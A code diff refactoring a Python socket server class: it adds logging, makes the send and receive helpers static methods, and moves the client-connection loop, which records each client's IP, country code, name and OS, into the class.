@@ -11,10 +11,11 @@ class Server:
         :param ip: ip address to host the server on
         :param port: port to listen for connections on
         """
+        config.log('Starting server on {}:{} ...'.format(ip, port))
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server_socket.bind((ip, port))
         self.server_socket.listen()
-        print('Listening for clients...')
+        config.log('Listening for clients...')
         self.client_sockets = []
         self.messages = []
 
@@ -22,7 +23,8 @@ class Server:
         """ Closes the server """
         self.server_socket.close()
 
-    def send(self, sock, message):
+    @staticmethod
+    def send(sock, message):
         """
         Sends a message in small chunks to the client
         :param sock: Client socket object
@@ -35,9 +37,10 @@ class Server:
             sock.send(message[:config.BUFFER_SIZE])
             message = message[config.BUFFER_SIZE:]
 
-    def receive(self, sock, as_bytes=False):
+    @staticmethod
+    def receive(sock, as_bytes=False):
         """
-        Recieve a message in small chunks from the client
+        Receive a message in small chunks from the client
         :param sock: Client socket object
         :param as_bytes: If set to True, this function will return the data as bytes. Default=False
         """
@@ -49,35 +52,31 @@ class Server:
                 data += chunk
         return data if as_bytes else data.decode(errors="ignore")
 
+    def client_connections(self):
+        """ Handles new connections and adds them to the client list. """
+        try:
+            while True:
+                (client_socket, addr) = self.server_socket.accept()
+                config.log('New connection from: ' + str(addr[0]))
+                client_data = self.receive(client_socket).split(',')  # IP,CountryCode,Name,OS
 
-def client_connections(server):
-    """
-    Handles new connections and adds them to the client list.
-    :param server: Server socket object
-    """
-    try:
-        while True:
-            (client_socket, addr) = server.server_socket.accept()
-            print('\n[+] New connection from: ', addr[0])
-            client_data = server.receive(client_socket).split(',')  # IP,CountryCode,Name,Os
-            print({'ip': client_data[0], 'data': {'countryCode': client_data[1], 'name': client_data[2], 'os': client_data[3], 'socket': client_socket}})
-            # Add new client to the clients list
-            exist = False
-            for client in config.client_list:
-                if client['ip'] == addr[0]:
-                    exist = True
-                    break
-            if not exist:
-                config.client_list.append({'ip': client_data[0], 'data': {'countryCode': client_data[1], 'name': client_data[2], 'os': client_data[3], 'socket': client_socket}})
-    except socket.error as e:
-        print(e)
-        client_connections(server)
+                # Add new client to the clients list
+                exist = False
+                for client in config.client_list:
+                    if client['ip'] == addr[0]:
+                        exist = True
+                        break
+                if not exist:
+                    config.client_list.append({'ip': client_data[0], 'data': {'countryCode': client_data[1], 'name': client_data[2], 'os': client_data[3], 'socket': client_socket}})
+        except socket.error as e:
+            config.log('Error: ' + str(e))
+            self.client_connections()
 
 
 def main():
-    server = Server('localhost', 8000)
-    threading.Thread(target=client_connections, args=(server,)).start()  # Thread to accept new connections
-    start_gui(server)
+    config.SERVER = Server('localhost', 8000)  # Initiates the server
+    threading.Thread(target=config.SERVER.client_connections).start()  # Thread to accept new connections
+    start_gui()  # Start the GUI
 
 
 if __name__ == "__main__":
